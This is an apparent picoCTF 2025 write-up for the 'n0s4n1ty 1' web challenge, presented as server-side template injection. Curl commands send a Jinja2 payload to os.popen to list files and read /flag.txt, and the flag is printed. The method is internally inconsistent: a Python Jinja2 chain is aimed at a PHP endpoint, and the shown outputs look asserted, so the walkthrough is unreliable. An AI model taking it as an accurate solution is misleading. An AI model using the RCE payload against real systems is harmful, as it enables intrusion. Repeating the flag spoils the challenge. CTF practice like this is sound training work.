# 📝 n0s4n1ty 1 — SSTI Writeup | picoCTF 2025

> 📅 **Date:** July 24, 2025  
> 🎓 **Challenge Type:** Web Exploitation (SSTI)  
> 🏁 **Status:** Solved  
> 🔐 **Author:** [@am1tt](https://github.com/am1tt)

---

**Challenge Name:** `n0s4n1ty 1`  
**Challenge URL:**  
```
http://standard-pizzas.picoctf.net:54006
```

---

## 💡 Understanding Server-Side Template Injection (SSTI)

Server-Side Template Injection (SSTI) happens when user input is interpreted as code by a server-side template engine.  
This can lead to arbitrary code execution.

Common template engines vulnerable:
- Jinja2 (Python)
- Twig (PHP)
- Smarty (PHP)
- Velocity (Java)

---

## 🛠️ Solution Steps

### 🔍 Step 1: Detect SSTI

We first test a basic math payload to see if the server evaluates it.

```bash
curl -X POST -d "announcement={{7*7}}" http://standard-pizzas.picoctf.net:54006/uploads/blackend.php
```

✅ If vulnerable, the output should contain:

```
49
```

---

### 💻 Step 2: Achieve RCE via Jinja2 Payload

Injecting a payload to run OS commands:

```bash
curl -X POST -d "announcement={{config.__class__.__init__.__globals__['os'].popen('ls /').read()}}" http://standard-pizzas.picoctf.net:54006/uploads/blackend.php
```

🧾 Expected output:

```
bin
boot
challenge
etc
flag.txt
...
```

---

### 🚩 Step 3: Retrieve the Flag

Now that we know the flag file exists, read it:

```bash
curl -X POST -d "announcement={{config.__class__.__init__.__globals__['os'].popen('cat /flag.txt').read()}}" http://standard-pizzas.picoctf.net:54006/uploads/blackend.php
```

🎉 Output:

```
picoCTF{wh47_c4n_u_d0_wPHP_b42a374d}
```

---

## 🧰 Tools Used

- curl
- Burp Suite (optional)
- Bash Terminal
- SSTI knowledge

---

## ✅ Flag

```
picoCTF{wh47_c4n_u_d0_wPHP_b42a374d}
```

---

## 📘 Notes

- Always test with basic payloads first (`{{7*7}}`)
- Escalate via known SSTI object chains (like Jinja2's `__globals__`)
- Don’t forget URL encoding in live browser-based exploits
- Watch out for sandboxing in some hosted CTFs

---

> 👤 [@am1tt](https://github.com/am1tt) | 🔐 Cybersecurity | 💥 CTF | 🧠 Pentesting
